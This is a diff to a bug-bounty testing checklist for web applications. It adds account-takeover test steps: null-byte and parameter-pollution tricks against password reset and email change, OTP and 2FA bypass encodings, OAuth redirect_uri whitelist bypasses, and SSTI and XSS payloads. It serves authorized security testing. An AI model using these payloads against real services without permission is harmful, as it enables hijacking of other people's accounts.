@@ -95,23 +95,9 @@ site:example.com filetype:sql
 ### Passive
 >**SubFinder**
 ```shell
-subfinder -d example.com -all -recursive -o sub_subfinder.txt 
+subfinder -d example.com -all -o sub_subfinder.txt 
 ```
 
->**Amass**
-```shell
-amass enum -passive -d example.com -o sub_amass_passive.txt
-```
-
->**Bbot**
-```shell
-bbot -t example.com -p subdomain-enum -rf passive -om subdomains -y -o /bbout
-```
-
->**Subenum**
-```shell
-./subenum.sh -d example.com -u wayback,crt,abuseipdb,Findomain,Subfinder,Amass,Assetfinder -o sub_subenum.txt
-```
 
 >**GitHub-SubDomains**
 >get your token : https://github.com/settings/personal-access-tokens
@@ -609,13 +595,13 @@ tax_rate=10&tax_exempt=yes
 	X-Remote-IP: 127.0.0.1
 	X-Client-IP: 127.0.0.1
 	```
-- [ ] Identify high-privilege functions from JS files or documentation, and try accessing them directly using lower roles
+- [ ] Identify high-privilege functions from JS files or documentation, and try accessing them directly using lower roles 
 - [ ] When a `User` updates their settings, add: `&role=Owner`, `&is_superuser=true`, `&access_level=99`
 - [ ] change the payload values inside the jwt like `"role":"user" --> "role":"admin"`
 - [ ] During the initial OAuth authorization request, manually append high-privilege scopes: `scope=read_profile` --> `scope=read_profile+write_settings+admin`
 - [ ] Register an account using the victim's email address via standard registration, then choose "Sign in with Google" using the same email. See if it merges both without verifying the original password.
 - [ ] use Authorize if there is a two roles like `admin , user`
-- [ ] use auth analyzer if there is many roles like `admin, owner , user, super_user , editor`
+- [ ] use auth analyzer if there is many roles like `admin, owner , user, super_user , editor` 
 
 ---
 
@@ -627,6 +613,7 @@ tax_rate=10&tax_exempt=yes
 - [ ] Change user_id in reset link: `/reset?token=XXX&user_id=ATTACKER_ID`
 - [ ] Change email parameter `/reset?token=XXX&email=attacker@evil.com`
 - [ ] Change username parameter if used
+- [ ] use null byte `https://lol.com?token=Valid_token%00anything`
 - [ ] try parameter Pollution 
  ```
 email=victim@gmail.com&email=attacker@gmail.com
@@ -634,6 +621,7 @@ email=victim@gmail.com%20email=attacker@gmail.com
 email=victim@gmail.com|email=attacker@gmail.com
 email=victim@gmail.com%0d%0acc:attacker@gmail.com
 email=victim@gmail.com&code=<TOKEN>
+email=victim@gmail.com&email%00=attacker@gmail.com
  ```
 - [ ] Send JSON array injection `{"email": ["victim@target.com", "attacker@evil.com"]}`
 - [ ] Check if you can change the user id 
@@ -661,7 +649,7 @@ email=victim@gmail.com&code=<TOKEN>
 - [ ] Check if the Referer header is leaking the password reset token
 - [ ] check if you can use the same token many times (token never expired)
 - [ ] try to delete the token and change password without it 
-- [ ] try to change the token value to `token=AAAAAAAA` or delete it like `token=`
+- [ ] try to change the token value to `token=AAAAAAAA` or delete it like `token=` or `token : null`
 - [ ] try to send many requests without the same victim info in the same second (race condition)
 - [ ] Password Reset Token leak Via Referrer header
 	1.  Request password reset to your email address
@@ -676,7 +664,15 @@ email=victim@gmail.com&code=<TOKEN>
 - [ ] check there is no rate limit for sending the otp 
 - [ ] check if no rate limit in otp (brute force to ato)
 - [ ] No OTP expiry or long expiry time
-- [ ] OTP bypass via null/empty value
+- [ ] OTP bypass via null/empty value 
+```text
+null
+\0  ---> C escape Sequence
+%00 ----> Url Encode
+\x00 ---> hex escape
+%2500 -->  Double Url Encoded
+\u0000 --> unicode escape
+```
 - [ ] change your id to the victim id
 - [ ] try special otp like `000000`
 - [ ] check if you can change the response of the otp request to `200 OK` (Response Manipulation )
@@ -694,8 +690,19 @@ email=victim@gmail.com&code=<TOKEN>
 - [ ] Parameter pollution: `new_email=attacker@evil.com&new_email=victim@company.com`
 - [ ] JSON array injection: `{"new_email": ["attacker@evil.com", "victim@company.com"]}`
 - [ ]  Change email with different session tokens
-- [ ] `attacker@evil.com\0victim@company.com` (null byte)
+- [ ] `attacker@evil.com\0victim@company.com`  , `email = victim@gmail.com%00@proton.me` (null byte)
+```text
+null
+\0  ---> C escape Sequence
+%00 ----> Url Encode
+\x00 ---> hex escape
+%2500 -->  Double Url Encoded
+\u0000 --> unicode escape
+```
 - [ ] `attacker@evil.com,victim@company.com` (multiple emails)
+- [ ] use non-breaking space `"new_email": "attacker@evil.com\u00A0victim@target.com"`
+- [ ] use non-breaking space with array `"new_email":["attacker@evil.com\u00A0victim@target.com" ]`
+- [ ] use null byte in the end of otp `otp = 12345%00`
 - [ ] injection in email field 
 	- [ ] SQL injection in email field: `test@evil.com'--`
 	- [ ] XSS payload in email field: `"><script>alert(1)</script>@evil.com`
@@ -758,6 +765,19 @@ git cone https://github.com/Dheerajmadhukar/4-ZERO-3.git
 - [ ] then use match and replace to change the Response and access this page from browser 
  
 ---
+> **OTHER SENARIOS**
+
+- [ ] Try using special characters—like an accented character (such as an _ā_) in the email or username—and see if the admin can delete that user when deleting by email or username.
+- [ ] check if you can set a empty username like [this](https://medium.com/@hgr00x/logic-vulnerability-caused-by-improper-input-validation-homoglyph-bypass-7d68e98ccde1) 
+- [ ] test Race conditions to add more then the limit users to your org
+- [ ] test Race conditions on any limits in the applications (users, groups , orgs , projects) any limit
+- [ ] use Race conditions Techniques on some requests like creation tokens [Writeup](https://medium.com/@hgr00x/broken-access-control-in-order-export-via-reusable-nonce-after-permission-revocation-e9ed31d7f73c)
+- [ ] 
+
+
+
+
+---
 # AUTHENTICATION BUGS
 
 > BROKEN AUTHENTICATION 
@@ -766,7 +786,7 @@ git cone https://github.com/Dheerajmadhukar/4-ZERO-3.git
 - [ ] Check rate limits on account creation (create many accounts)
 - [ ] Use username@**burp_collab**.net and analyze the **callback**
 - [ ]  look at the default credentials in  [CIRT.net](https://www.cirt.net/passwords). or brute force it using [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
-- [ ] 
+- [ ] Try registering with emails that look privileged, such as: `admin@target.com , staff@target.com , ceo@target.com , hr@target.com`
 - [ ] old session dose not expird
  ```text
     1.create An account On Your Target Site
@@ -774,7 +794,6 @@ git cone https://github.com/Dheerajmadhukar/4-ZERO-3.git
     3.Change You Password In Chrome, On Seccessfull Password Change Referesh Your Logged in Account In FireFox/Incognito Mode.
     4.If you'r still logged in Then This Is a Bug
  ```
-
 
 *2FA & OTP :*
 
@@ -792,6 +811,7 @@ git cone https://github.com/Dheerajmadhukar/4-ZERO-3.git
 | Clickjacking on 2FA Disabling Page            |
 | Enabling 2FA Without Expiring Active Sessions |
 | Bypass 2FA with `null` or `000000`            |
+|                                               |
 
 - [ ] check if there is no rate limit in login with OTP
 - [ ] try to skip 2fa pages like delete the 2fa form url `/nour/2fa --> /nour/profile` (force browsing)
@@ -810,6 +830,14 @@ git cone https://github.com/Dheerajmadhukar/4-ZERO-3.git
 - [ ] check if the account locks after several attempts of brute forceing the otp 
 - [ ] check the `000000`or `111111` or `123456` is valid (misconfiguration)
 - [ ] Bypass 2FA with `null`
+```text
+null
+0\  ---> C escape Sequence
+%00 ----> Url Encode
+x00\ ---> hex escape
+%2500 -->  Double Url Encoded
+u0000\ --> unicode escape
+```
 - [ ] Clickjacking on 2FA Disabling Page
 - [ ] try CSRF
 	```html
@@ -843,23 +871,26 @@ git cone https://github.com/Dheerajmadhukar/4-ZERO-3.git
 
 ---
 
->OAUTH
+> OAUTH
 
- - [x]  if `response_type=token` check if you can change any user info parameter in authenticate request to get ATO
- - [x] try to change the `response_type=token` to `response_type=code` and see what happend
-- [x] Exploit OAuth CSRF (missing `state` parameter) to link attacker’s social account to victim by forcing `/oauth-linking?code=ATTACKER_CODE` via `iframe` leading to ATO via social login.
-- [x] try to delete `state` parameter
-- [x] try to change value of `state` parameter 
-- [x] Exploit weak `redirect_uri` validation to leak authorization code via attacker-controlled domain, then reuse the stolen code to authenticate as the victim (open redirect to ATO).
-- [x] If external `redirect_uri` is blocked → pivot to internal paths and exploit open redirects , XSS or other bugs to leak the code/token.
-- [x] OAuth misconfiguration where the server redirects to `redirect_uri` even on validation errors (e.g. invalid scope), leading to an [open redirect that can be abused for phishing attacks](https://infosecwriteups.com/500-bug-bounty-open-redirection-via-oauth-on-shopify-4159387482f9)
-- [x] check if you can change value of [email parameter after OAuth authentication](https://medium.com/@hacker_might/this-oauth-bug-earned-me-account-takeover-via-identity-injection-27774f65288c)
-- [x] check of [pre-ATO](https://medium.com/@KhaledAhmed107/how-i-found-5-oauth-misconfigurations-leading-to-pre-account-takeover-in-public-bug-bounty-programs-021d4c8c6954)
+
+ - [ ]  Try intercepting the Google signup/binding request, replace the email with an unregistered email address to create the account, then use "Forgot Password" to take it over so your Google login accesses it. [writeup](https://medium.com/@hgr00x/small-oauth-implementation-flaws-can-lead-to-account-binding-vulnerabilities-90d551bb55d9)
+ - [ ] 
+ - [ ] if `response_type=token` check if you can change any user info parameter in authenticate request to get ATO
+- [ ] try to change the `response_type=token` to `response_type=code` and see what happend
+- [ ] Exploit OAuth CSRF (missing `state` parameter) to link attacker’s social account to victim by forcing `/oauth-linking?code=ATTACKER_CODE` via `iframe` leading to ATO via social login.
+- [ ] try to delete `state` parameter
+- [ ] try to change value of `state` parameter 
+- [ ] Exploit weak `redirect_uri` validation to leak authorization code via attacker-controlled domain, then reuse the stolen code to authenticate as the victim (open redirect to ATO).
+- [ ] If external `redirect_uri` is blocked → pivot to internal paths and exploit open redirects , XSS or other bugs to leak the code/token.
+- [ ] OAuth misconfiguration where the server redirects to `redirect_uri` even on validation errors (e.g. invalid scope), leading to an [open redirect that can be abused for phishing attacks](https://infosecwriteups.com/500-bug-bounty-open-redirection-via-oauth-on-shopify-4159387482f9)
+- [ ] check if you can change value of [email parameter after OAuth authentication](https://medium.com/@hacker_might/this-oauth-bug-earned-me-account-takeover-via-identity-injection-27774f65288c)
+- [ ] check of [pre-ATO](https://medium.com/@KhaledAhmed107/how-i-found-5-oauth-misconfigurations-leading-to-pre-account-takeover-in-public-bug-bounty-programs-021d4c8c6954)
 	1.  Register using victim email (no verification)
 	2. logout
 	3. login vial OAuth with the same email 
 	4. if logged in without verification -> pre ATO 
-- [x] try to create account manual then in another browser login with OAuth with the same email and change the password if you still logged in at the first browser in the same account so its a bug and if you in a different account so you can use the same email in many accounts 
+- [ ] try to create account manual then in another browser login with OAuth with the same email and change the password if you still logged in at the first browser in the same account so its a bug and if you in a different account so you can use the same email in many accounts 
 	```
 	1. Create an account manually using a test/victim email (no email verification).
 	2. Stay logged in (Browser 1).
@@ -870,12 +901,12 @@ git cone https://github.com/Dheerajmadhukar/4-ZERO-3.git
 	- If you are logged into a different account → Email duplication / account confusion (BUG)
 	- If both logins lead to the same account → Check for account takeover scenarios.
 	```
-- [x] Add json or xml extension to OAuth Endpoint `POST /oauth/Connect.json HTTP/1.1`
-- [x] Try XSS in OAuth connect/callback 
+- [ ] Add json or xml extension to OAuth Endpoint `POST /oauth/Connect.json HTTP/1.1`
+- [ ] Try XSS in OAuth connect/callback 
 	```json
 	GET /oauth/Connect?)%7D(alert)(location);%7B%3C!--&state=\&redirect_uri=URL&scope=read&type=code&client_id=ID& HTTP/1.1 
 	```
-- [x] Try SSTI in scope parameter
+- [ ] Try SSTI in scope parameter
 	```json
 	GET /oauth/Connect? type=code&client_id=ID&state=Random&redirect_uri=URL &scope=${T(Java.lang.Runtime).getRuntime(). exec("calc.exe")} HTTP/1.1 
 	Host: www.company.com 
@@ -884,16 +915,16 @@ git cone https://github.com/Dheerajmadhukar/4-ZERO-3.git
 	Origin: https://www.company.com 
 	Accept-Encoding: gzip, deflate
 	```
-- [x] Try XSS in Redirect URI Parameter 
+- [ ] Try XSS in Redirect URI Parameter 
 	```json
 	client_id=ID&client_secret=SECRET&type=Authorization& code=Auth_code&redirect_uri=javascript:fetch('XSS')
 	```
-- [x]  Try To Insert Redirect URL Parameter To Redirect URL As Value To Steal The Authorization Code OR The Access Token
+- [ ]  Try To Insert Redirect URL Parameter To Redirect URL As Value To Steal The Authorization Code OR The Access Token
 	```json
 	GET /oauth/Connect?type=code&client_id=ID&state=Random &redirect_uri=https://www.company.com.com/../../redirect_ uri=https://me.com&scope=read HTTP/1.1
 	```
-- [x] try to change the request method
-- [x] check if you can get XSS from `code` parameter 
+- [ ] try to change the request method
+- [ ] check if you can get XSS from `code` parameter 
 - List Of Patterns To Bypass The Whitelist In Redirect URL Parameter
 ```
 https://me.com\@www.company.com
@@ -919,6 +950,14 @@ evil.com?company.com
 me.com%09company.com
 /\me.com
 ```
+
+---
+> SSO 
+
+
+---
+> Remember me
+
 
 ---
 
